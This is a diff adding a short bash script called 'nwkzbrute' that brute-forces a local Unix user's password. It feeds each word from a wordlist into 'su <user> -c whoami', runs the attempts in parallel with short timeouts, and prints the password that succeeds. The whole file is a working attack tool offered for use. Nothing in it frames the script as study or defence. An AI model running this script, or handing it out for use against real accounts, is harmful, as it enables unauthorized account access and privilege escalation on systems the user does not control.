@@ -1,0 +1,32 @@
+
+#!/bin/bash
+
+# // 951a27547f1995cb45e7f70e4092cdbd # //
+
+if [ $# != 2 ];then
+	printf "\n[*] ./nwkzbrute <USER> <WORDLIST> [*]\n\n";exit 0;
+
+elif ! [ -f $2 ];then
+	printf "\nwordlist not found !\n\n";exit 0;
+fi
+
+W=$2
+loop()
+{
+	request=`echo $2|timeout 0.2 su $1 -c whoami 2>/dev/null`
+
+	if [ $request ];then
+		printf "\n[*] User: %s  Password: %s [*]\n" $1 $2;exit 0;
+	fi
+}
+
+program()
+{
+	while pass='' read -r PASS || [ -n "${PASS}" ];do
+		loop $1 $PASS &
+		sleep 0.004
+	done < "$W"
+}
+
+program $1
+echo
